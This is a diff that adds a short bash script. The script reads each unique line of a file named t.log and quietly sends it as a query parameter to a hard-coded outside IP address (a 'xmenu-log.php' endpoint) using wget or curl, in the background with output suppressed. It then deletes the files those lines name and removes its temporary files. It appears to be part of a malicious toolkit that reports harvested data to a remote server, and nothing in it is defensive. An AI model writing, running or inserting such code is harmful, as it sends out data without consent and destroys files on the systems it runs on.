@@ -1,0 +1,40 @@
+#!/bin/bash
+
+
+if which wget >/dev/null; then
+
+for i in `cat t.log|sort|uniq`
+do
+wget -O .tmp http://185.7.63.37/xmenu-log.php?request="$i" &>/dev/null&
+done
+else
+
+
+if which curl >/dev/null; then
+
+for i in `cat t.log|sort|uniq`
+do
+curl -O http://185.7.63.37/xmenu-log.php?request="$i" &>/dev/null&
+rm -rf $i
+done
+else
+
+if which fetch >/dev/null; then
+
+for i in `cat t.log|sort|uniq`
+do
+curl -O http://185.7.63.37/xmenu-log.php?request="$i" &>/dev/null&
+rm -rf $i
+done
+
+
+fi
+
+fi
+
+fi
+
+
+sleep 1
+
+rm -rf .tmp*
